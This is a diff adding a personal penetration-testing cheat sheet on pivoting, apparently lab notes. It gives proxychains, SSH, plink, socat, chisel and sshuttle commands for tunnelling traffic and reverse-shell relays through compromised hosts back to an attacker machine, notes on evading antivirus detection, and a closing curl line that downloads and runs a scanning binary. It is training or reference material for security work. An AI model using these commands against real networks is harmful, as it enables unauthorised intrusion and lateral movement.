@@ -1,0 +1,122 @@
+- proxychains
+    - command : proxychains COMMAND [**args]
+    - configuration files : 
+        - ./proxychains.conf
+        - ~/.proxychains/proxychains.conf
+        - /etc/proxychains.conf
+    - syntax : 
+        [ProxyList]
+        socks4  127.0.0.1 9050
+        <socks4|socks5|http> IP_ADDRESS PORT
+    - features : 
+        - only TCP scan are allowed (no UDP, ICMP, SYN, ...)
+        - very slow
+
+- web proxy (foxyproxy):
+    - features : 
+        - is only used to tunnel all web requests
+        - better than proxychains for web requests
+
+- ssh : 
+    - forward connexions : 
+        - port forwarding : 
+            - command : ssh -L LOCAL_PORT:TARGET_IP:TARGET_PORT USER@COMPROMIZED_MACHINE_IP [-i PRIV_KEY] -fN
+        - proxying : 
+            - command : ssh -D LOCAL_PORT USER@COMPROMIZED_MACHINE_IP [-i PRIV_KEY] -fN
+    - reverse connexion : 
+        - prerequesite : 
+            - disallow to run command from the compromized machine to the attacker : 
+                - on the attacking machine, past this in the ~/.ssh/authorized_keys : command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty <PUBLIC_KEY>
+            - transfer the private key to the compromized host
+            - start the ssh service : sudo systemctl start ssh
+        - port forwarding :
+            - command : ssh -R ATTACKER_PORT:TARGET_IP:TARGET_PORT ATTACKER_USERNAME@ATTACKING_IP -i PRIV_KEY -fN
+        - proxy : 
+            - ssh -R ATTACKER_PORT ATTACKER_USERNAME@ATTACKING_IP -i PRIV_KEY -fN
+        
+- plink.exe
+    - description : it is a cli version of putty
+    - use case : copy the binary to a compromized server and use to create a reverse connexion
+    - prerequesite : 
+        - generate a private key with ssh-keygen
+        - generate an appropriate private key using the fresh private key : 
+            - command : puttygen PRIV_KEY -o PRIV_KEY.ppk
+    - syntax : 
+        - port forwarding
+            - command : cmd.exe /c echo y | .\plink.exe -R ATTACKER_PORT:TARGET_IP:TARGET_PORT ATTACKER_USERNAME@ATTACKING_IP -i PRIV_KEY -N
+        - proxy : 
+            - command : cmd.exe /c echo y | .\plink.exe -R ATTACKER_PORT ATTACKER_USERNAME@ATTACKING_IP -i KEYFILE -N
+    - source : 
+        - kali : /usr/share/windows-resources/binaries/plink.exe
+        - remote : https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html
+
+- socat : 
+    - description : use to connect two things
+    - cons : 
+        - detected by antiviruses on windows with the default binary so need customization compilation
+        - not installed on any system by default
+        - hard syntax
+    - use case : 
+        - reverse/bind shell
+        - port forwarding
+        - relay
+    - syntax : 
+        - reverse shell relay : 
+            - commands :
+                - creating relay : socat tcp-l:LOCAL_PORT tcp:ATTACKING_IP:ATTACKER_PORT &
+                - creating listner on the LOCAL_PORT on the compromized host : nc -nlvp LOCAL_PORT
+                - creating a listner on the attacking machine : nc -nlvp ATTACKER_PORT
+        - port forwarding : 
+            - easy : 
+                - command : socat tcp-l:LOCAL_PORT,fork,reuseaddr tcp:TARGET_IP:TARGET_PORT &
+                - description : this redirect all trafic to TARGET_IP:TARGET_PORT through LOCAL_PORT on the compromized host
+                - fork, and reuseaddr : allow to use the same port forward multiple time
+            - quiet : 
+                - commands : 
+                    - on the attacking machine : socat tcp-l:SECOND_PORT tcp-l:FIRST_PORT,fork,reuseaddr &
+                    - on the compromized host : socat tcp:ATTACKING_IP:SECOND_PORT tcp:TARGET_IP:TARGET_PORT,fork &
+                - description : 
+                    - this create a port forwarding without opening any port on the compromized machine
+                    - this link the TARGET_IP:TARGET_PORT to localhost:FIRST_PORT
+                
+- chisel : 
+    - description :
+        - allow portforwarding and proxying
+        - do not need ssh
+    - source : 
+        - https://github.com/jpillora/chisel/releases
+    - syntax :
+        - proxy : 
+            - reverse SOCKS proxy : 
+                - on the attacker machine : chisel server -p LISTEN_PORT --reverse &
+                - on the compromized machine : chisel client ATTACKING_IP:LISTEN_PORT R:socks &
+                - this create a proxy on the localhost in PROXY_PORT, a port other than the LISTEN_PORT
+            - forward SOCKS proxy :
+                - on the attacker machine : chisel client VICTIM_IP:LISTEN_PORT PROXY_PORT:socks
+                - on the compromized machine : chisel server -p LISTEN_PORT --socks5
+            - usage : 
+                - chisel use socks5 so the configuration to use it in the proxychains : 
+                    [ProxyList]
+                    socks5  127.0.0.1 PROXY_PORT
+        - port forwarding : 
+            - reverse : 
+                - on the attacker machine : chisel server -p LISTEN_PORT --reverse &
+                - on the compromized machine : chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT &
+            - forward :
+                - on the compromized machine : chisel server -p LISTEN_PORT &
+                - on the attacker machine : chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT
+
+- sshuttle : 
+    - description : 
+        - create a new interface
+    - source : 
+        - github : https://github.com/sshuttle/
+        - apt installation : sudo apt install sshuttle
+    - syntax : 
+        - random IP : 
+            - automatically detect subnet : sshuttle -r VICTIM_USER@VICTIM_IP --ssh-cmd "ssh -i KEYFILE" -x VICTIM_IP -N
+            - explicit subnet : sshuttle -r VICTIM_USER@VICTIM_IP SUBNET --ssh-cmd "ssh -i KEYFILE" -x VICTIM_IP
+
+curl http://10.50.86.84/nmap -o nmap-hackibosy && chmod +x nmap-hackibosy
+
+./nmap-hackibosy -sn 10.200.85.1-255 -oN scan-hackibosy
